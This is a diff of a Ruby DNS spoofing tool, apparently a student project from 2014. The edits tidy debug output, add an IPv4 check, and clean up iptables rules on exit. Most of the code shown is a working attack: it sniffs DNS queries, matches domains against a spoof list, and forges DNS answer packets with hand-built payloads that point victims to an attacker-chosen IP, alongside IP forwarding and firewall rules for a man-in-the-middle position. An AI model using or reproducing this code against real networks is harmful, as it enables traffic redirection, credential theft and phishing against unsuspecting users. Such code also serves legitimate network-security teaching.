@@ -155,22 +155,19 @@ end
 ##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
 ##
 ##	NOTES:
-##	        Makes the configure file actualy work.
+##	        Makes the configure file actually work.
 ##
 ##
 ######################################################################
 def check_spoof(domainName)
   $spoof_hash.each_key do |k|
     if domainName =~ /#{k}/
-      puts "Spoofing: " +  Resolv.getaddress( $spoof_hash[k])
       return Resolv.getaddress $spoof_hash[k]
     end
   end
-  puts "Getting: " + domainName
 
   x = Resolv.getaddress domainName
 
-puts x
   return x
 rescue Resolv::ResolvError => e
   p e.message
@@ -187,7 +184,6 @@ end
 ##				    domainName:   The domain name to test against the spoof list
 ##            spoof_ip:     The ip to spoof
 ##
-##
 ##	RETURNS:        nothing
 ##
 ##	LAST MODIFIED:  Nov 1, 2014
@@ -203,41 +199,45 @@ end
 ######################################################################
 def sendResponse(packet, domainName, spoof_ip)
 
-  # Convert the IP address
-  myIP = spoof_ip.split(".");
-  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
-  # Create the UDP packet
-  response = UDPPacket.new
-  response.udp_src = packet.udp_dst
-  response.udp_dst = packet.udp_src
-  response.ip_saddr = packet.ip_daddr
-  response.ip_daddr = packet.ip_saddr
-  response.eth_daddr = packet.eth_saddr
-  response.eth_saddr = packet.eth_daddr
+  if spoof_ip =~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
 
-  # Transaction ID
-  response.payload = packet.payload[0,2]
-  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+    # Convert the IP address
+    myIP = spoof_ip.split(".");
+    myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
-  # Domain name
-  domainName.split(".").each do |section|
-    response.payload += section.length.chr
-    response.payload += section
+    # Create the UDP packet
+    response = UDPPacket.new
+    response.udp_src = packet.udp_dst
+    response.udp_dst = packet.udp_src
+    response.ip_saddr = packet.ip_daddr
+    response.ip_daddr = packet.ip_saddr
+    response.eth_daddr = packet.eth_saddr
+    response.eth_saddr = packet.eth_daddr
+
+    # Transaction ID
+    response.payload = packet.payload[0,2]
+    response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+
+    # Domain name
+    domainName.split(".").each do |section|
+      response.payload += section.length.chr
+      response.payload += section
+    end
+
+    # Set more default values...........
+    response.payload += "\x00\x00\x01" + "\x00\x01\xc0\x0c\x00"
+    response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00\x04"
+
+    # IP
+    response.payload += myIP2
+
+    # Calculate the packet
+    response.recalc
+
+    # Send the packet out
+    response.to_w($iface)
   end
-
-  # Set more default values...........
-  response.payload += "\x00\x00\x01" + "\x00\x01\xc0\x0c\x00"
-  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00\x04"
-
-  # IP
-  response.payload += myIP2
-
-  # Calculate the packet
-  response.recalc
-
-  # Send the packet out
-  response.to_w($iface)
 
 end
 
@@ -328,7 +328,6 @@ end
 ##	INTERFACE:	    sniff(iface)
 ##
 ##            iface:        The network interface to capture packets
-
 ##
 ##
 ##	RETURNS:        nothing
@@ -360,7 +359,6 @@ def sniff(iface)
         next
       end
       spoof_ip = check_spoof(domain)
-      pp "SPOOFIP: " + spoof_ip.to_s
       if !spoof_ip.nil?
         sendResponse(packet, domain, spoof_ip)
       end
@@ -382,6 +380,8 @@ begin
 
 rescue Interrupt
   puts "\nDNS spoof stopped by interrupt signal."
+  `iptables -D FORWARD -p UDP --dport 53 -j DROP`
+  `iptables -D FORWARD -p TCP --dport 53 -j DROP`
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   exit 0
 
